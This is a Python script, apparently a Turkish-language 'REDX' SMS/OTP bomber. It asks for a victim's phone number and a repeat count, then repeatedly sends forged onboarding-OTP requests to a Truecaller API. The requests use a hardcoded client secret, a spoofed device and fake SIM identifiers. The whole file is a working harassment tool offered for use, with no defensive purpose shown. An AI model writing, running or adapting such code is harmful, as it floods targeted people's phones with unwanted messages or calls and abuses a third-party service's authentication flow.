import os

try:
    from colorama import Fore
except ImportError:
    print("Modüller Derleniyor.")
    os.system("pip install colorama")

try:
    import requests
except ImportError:
    print("Modüller Derleniyor.")
    os.system("pip install requests")

import random
import hashlib
import time
time.sleep(1)
print(Fore.GREEN + "Modüller Başarıyla Derlendi." + Fore.RESET)
time.sleep(2)
os.system("cls")
print(Fore.RED + '''
██████╗░ ███████╗ ██████╗░ ██╗░░██╗
██╔══██╗ ██╔════╝ ██╔══██╗ ╚██╗██╔╝
██████╔╝ █████╗░░ ██║░░██║ ░╚███╔╝░
██╔══██╗ ██╔══╝░░ ██║░░██║ ░██╔██╗░
██║░░██║ ███████╗ ██████╔╝ ██╔╝╚██╗
╚═╝░░╚═╝ ╚══════╝ ╚═════╝░ ╚═╝░░╚═╝
      ''' + Fore.RESET)

print (Fore.CYAN + "Numaranın Başına Ülke Kodu Ekleyiniz (+90)" + Fore.RESET)
time.sleep(1)
print (Fore.MAGENTA + "Örnek No: +905555555555" + Fore.RESET)
time.sleep(1)
phone_number = input(Fore.RED + "\nNumara Giriniz: " + Fore.RESET)
miktar = int(input(Fore.RED + "Kaç kez spam göndermek istiyorsunuz: " + Fore.RESET))

asa = '123456789'
gigk = ''.join(random.choice(asa) for i in range(10))
md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]

clientsecret = 'lvc22mp3l1sfv6ujg83rd17btt'
user_agent = 'Truecaller/12.34.8 (Android;8.1.2)'
accept_encoding = 'gzip'
content_length = '680'
content_type = 'application/json; charset=UTF-8'
Host = 'account-asia-south1.truecaller.com'
headers = dict(zip(('clientsecret', 'user-agent', 'accept-encoding', 'content-length', 'content-type', 'Host'), 
                   (clientsecret, user_agent, accept_encoding, content_length, content_type, Host)))

url = 'https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp'

def send_spam(phone_number):
    data = ('{"countryCode":"eg","dialingCode":20,"installationDetails":{"app":{"buildVersion":8,"majorVersion":12,'
            '"minorVersion":34,"store":"GOOGLE_PLAY"},"device":{"deviceId":"' + md5 + '","language":"ar",'
            '"manufacturer":"Xiaomi","mobileServices":["GMS"],"model":"Redmi Note 8A Prime","osName":"Android",'
            '"osVersion":"7.1.2","simSerials":["8920022021714943876f","8920022022805258505f"]},"language":"ar",'
            '"sims":[{"imsi":"602022207634386","mcc":"602","mnc":"2","operator":"vodafone"},{"imsi":"602023133590849",'
            '"mcc":"602","mnc":"2","operator":"vodafone"}],"storeVersion":{"buildVersion":8,"majorVersion":12,'
            '"minorVersion":34}},"phoneNumber":"' + phone_number + '","region":"region-2","sequenceNo":1}')
    response = requests.post(url, headers=headers, data=data)
    if response.status_code == 200:
        print(Fore.GREEN + 'Başarıyla Gönderildi.' + Fore.RESET)
    else:
        print(Fore.RED + 'Arama Gönderilemedi.' + Fore.RESET)


while miktar != 0:
    send_spam(phone_number)
    time.sleep(1)
    miktar -=    1